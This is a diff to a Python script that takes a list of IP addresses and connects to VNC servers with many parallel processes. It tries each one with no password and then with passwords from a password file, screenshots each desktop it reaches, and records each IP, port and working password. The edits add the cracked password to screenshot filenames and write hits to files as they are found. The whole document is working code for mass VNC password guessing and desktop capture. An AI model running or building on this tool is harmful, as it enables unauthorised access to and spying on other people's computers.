@@ -34,7 +34,7 @@ process_amount = 50
 screenshot_path = os.getcwd().replace('\\', '/') + "/results/screenshots/"
 
 password_file = "./passwords.txt"
-ipfile = "./pw_results.txt"
+ipfile = "./results.txt"
 valid_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_validips.txt"
 password_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_passwordips.txt"
 
@@ -56,7 +56,7 @@ if password_check:
     passwords = [line.strip() for line in open(password_file)]
 
 def screencapture(startendpts):
-    #startendpts in format: [start:end] eg: [0,52] [53, 106]...
+    #startendpts in format: [start,end] eg: [0,52] [53, 106]...
     start = startendpts[0]
     end = startendpts[1]
     passed_ips = []
@@ -68,8 +68,7 @@ def screencapture(startendpts):
         screenshot_starttime = datetime.now()
         vncserver = vncservers[i]
         timestr = time.strftime("%Y%m%d-%H%M%S")
-        #screenshot_filename = timestr + ".png"
-        screenshot_filename = str(i+1) + "_" + vncserver + "_" + timestr + ".png"
+        screenshot_filename = str(i+1) + "_" + vncserver + "_" + vncport + "_" + timestr + ".png"
         try:
             #Test connection
             client = api.connect(vncserver, password=None)
@@ -110,6 +109,7 @@ def screencapture(startendpts):
                     try:
                         client = api.connect(vncserver, password=correctpass)
                         client.timeout = screenshot_timeout
+                        screenshot_filename = str(i+1) + "_" + vncserver + "_" + vncport + "_" + correctpass + "_" + timestr + ".png"
                         client.captureScreen(screenshot_path + screenshot_filename)
                         client.disconnect()            
                     except Exception as e:
@@ -119,12 +119,14 @@ def screencapture(startendpts):
                         screenshot_duration = screenshot_endtime - screenshot_starttime
                         print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
                         passed_amt += 1  
-                        passed_ips.append(vncserver + ":" + vncport + ":" + correctpass)                         
+                        line = vncserver + ":" + vncport + ":" + correctpass  
+                        appendlinetofile(valid_ipfile, line)
                     
                 else:
                     print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has failed because it requires a password you do not have.")
                     password_failed_amt += 1
-                    password_failed_ips.append(vncserver + ":" + vncport)
+                    line = vncserver + ":" + vncport
+                    appendlinetofile(password_ipfile, line)
             else:
                 None
                 print("Screencapture for IP " + str(i) + "/" + str(end) + " has failed: " + str(e))
@@ -134,16 +136,21 @@ def screencapture(startendpts):
             screenshot_duration = screenshot_endtime - screenshot_starttime
             print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
             passed_amt += 1  
-            passed_ips.append(vncserver + ":" + vncport)
+            line = vncserver + ":" + vncport
+            appendlinetofile(valid_ipfile, line)
     
     resultsdict = {}
-    resultsdict['passed_ips'] = passed_ips
-    resultsdict['password_failed_ips'] = password_failed_ips
     resultsdict['password_failed_amt'] = password_failed_amt
     resultsdict['passed_amt'] = passed_amt
     resultsdict['failed_amt'] = failed_amt
     return resultsdict     
     
+        
+def appendlinetofile(file, line):
+    print("Writing " + line + " to " + file)
+    with open(file, "a") as myfile:
+        myfile.write(line + "\n") 
+    print("Finished writing " + line + " to " + file)
         
         
 def readipfile():
@@ -161,7 +168,7 @@ split_serveramt = int(serveramt / process_amount)
 
 print("IPs to attempt to screen capture: " + str(serveramt) + ". There will be " + str(process_amount) + " processes handling " + str(split_serveramt) + " IPs each.")
 
-
+ 
 if __name__ == '__main__':
     processlist = []
     xypairs = []
@@ -176,30 +183,14 @@ if __name__ == '__main__':
     result_list = pool.map(screencapture, xypairs)
     print("results: ")
     passed_amt = password_failed_amt = failed_amt = 0
-    passed_ips = []
-    password_failed_ips = []
     
     for result in result_list:
         passed_amt += result['passed_amt']
         password_failed_amt += result['password_failed_amt']
         failed_amt += result['failed_amt']
-        for ip in result['password_failed_ips']:
-            password_failed_ips.append(ip)
-        for ip in result['passed_ips']:
-            passed_ips.append(ip)
         
              
 #Will not go further until all of the process_amount have finished.
 print("Screencaptures have finished. Passed: " + str(passed_amt) + ". Password failed: " + str(password_failed_amt) + ". Failed: " + str(failed_amt) + ".")
-print("Writing passed IPs to file.")
-with open(valid_ipfile, "w") as myfile:
-    for ip in passed_ips:
-        myfile.write(ip + "\n")    
-print("Passed IPs have been written to " + valid_ipfile)
-print("Writing password-failed IPs to file.")
-with open(password_ipfile, "w") as myfile:
-    for ip in password_failed_ips:
-        ip += "\n"
-        myfile.write(ip)  
-        
+print("Passed IPs have been written to " + valid_ipfile)   
 print("Password-failed IPs have been written to " + password_ipfile)
